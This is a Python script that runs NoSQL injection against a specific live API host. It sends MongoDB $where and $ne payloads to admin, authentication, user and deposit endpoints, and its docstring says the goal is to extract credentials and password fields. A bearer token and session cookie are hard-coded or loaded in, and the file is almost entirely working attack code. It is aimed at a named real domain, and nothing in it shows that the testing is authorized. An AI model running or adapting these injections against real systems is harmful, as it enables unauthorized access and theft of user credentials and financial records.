#!/usr/bin/env python3
"""probe_nosql_bo.py — NoSQL injection on pbapi BO-related endpoints.

   F02 confirmed $where on /pb/latest-win (FeathersJS MongoDB).
   Try $where on authentication and BO-admin services to extract credentials.
"""
import json, pathlib, requests, urllib.parse

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
DOMAIN = "m.vak88z2.com"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
HDR = {"Authorization": f"Bearer {JWT}", "Cookie": f"AWSALB={AWSALB}"}

def get_inj(path, params_str):
    url = f"{PBAPI}{path}?{params_str}"
    try:
        r = requests.get(url, headers=HDR, timeout=10)
        if r.ok and r.text not in ("", "null", '{"total":0,"data":[]}'):
            return f"HTTP {r.status_code} [{len(r.text)}B]: {r.text[:400]}"
        return f"HTTP {r.status_code}: {r.text[:100]}"
    except Exception as e:
        return f"ERR: {e}"

# ── BO admin services on pbapi ─────────────────────────────────────────────────
BO_PATHS = [
    "/bo/authentication",       # Auth collection
    "/bo/admin",               # Admin users
    "/bo/admins",              # Alt name
    "/bo/users",               # Users
    "/bo/admin-users",         # Alt
    "/bo/admin-v2",            # From JS bundle
    "/pb/bo-users",
    "/pb/admin",
    "/pb/admins",
]

print("=== Probing BO service paths for NoSQL injection ===")
for path in BO_PATHS:
    # Basic $where injection
    for where in [
        "$where=this.password.length>0",
        "$where=this.passwordHash.length>0",
        "$where=this.username=='admin'",
        "$where=1==1",
    ]:
        params = f"domain={DOMAIN}&{where}"
        result = get_inj(path, params)
        if "400" not in result and "404" not in result and "401" not in result:
            print(f"  [!!!] {path}?{where[:40]}: {result}")
        elif "200" in result or len(result) > 60:
            print(f"  {path}: {result[:120]}")
        # Only print interesting results
    # Also try without $where
    r = requests.get(f"{PBAPI}{path}?domain={DOMAIN}&skip=0&limit=5",
                     headers=HDR, timeout=10)
    if r.ok and "password" in r.text.lower():
        print(f"  [!!!] {path} leaks password field: {r.text[:300]}")

# ── Try $where on deposit services ────────────────────────────────────────────
print("\n=== Deposit services NoSQL injection ===")
DEP_PATHS = [
    "/pb/deposit",
    "/pb/deposits",
    "/pb/deposit-transaction",
    "/pb/deposit-transactions",
]
for path in DEP_PATHS:
    params = f"domain={DOMAIN}&approve_status=success&$where=this.user_id.length>0"
    result = get_inj(path, params)
    if "404" not in result:
        print(f"  {path}: {result[:200]}")

# ── Try known working path with credential extraction ─────────────────────────
print("\n=== /pb/latest-win credential extraction ===")
# Already confirmed $where works here — try to extract more fields
injection_tests = [
    # Find records with specific user data
    "$where=this.admin_id!=null",
    "$where=typeof this.bo_token !== 'undefined'",
    "$where=this.token!=null",
    # Try to access cross-collection via JavaScript
    "$where=this.constructor.prototype.hasOwnProperty('password')",
]
for inj in injection_tests:
    params = f"domain={DOMAIN}&{inj}"
    result = get_inj("/pb/latest-win", params)
    print(f"  {inj[:50]}: {result[:150]}")

# ── $where on /pb/authentication service ─────────────────────────────────────
print("\n=== /pb/authentication NoSQL injection ===")
auth_injections = [
    f"domain={DOMAIN}&$where=this.userId.length>0",
    f"domain={DOMAIN}&$where=this.accessToken.length>0",
    f"domain={DOMAIN}&userId[$ne]=",
    f"domain={DOMAIN}&strategy=local&username[$ne]=",
]
for params in auth_injections:
    result = get_inj("/pb/authentication", params)
    print(f"  {params[:60]}: {result[:200]}")

# ── Try NoSQL on /pb/users (player service) ────────────────────────────────────
print("\n=== /pb/users NoSQL injection ===")
user_injections = [
    f"domain={DOMAIN}&$where=this.role=='admin'",
    f"domain={DOMAIN}&$where=this.is_admin==true",
    f"domain={DOMAIN}&role[$ne]=player",
    f"domain={DOMAIN}&$where=this.password.length>6",
    f"domain={DOMAIN}&username[$ne]=&$limit=5",
]
for params in user_injections:
    result = get_inj("/pb/users", params)
    print(f"  {params[:60]}: {result[:200]}")

print("\n=== DONE ===")
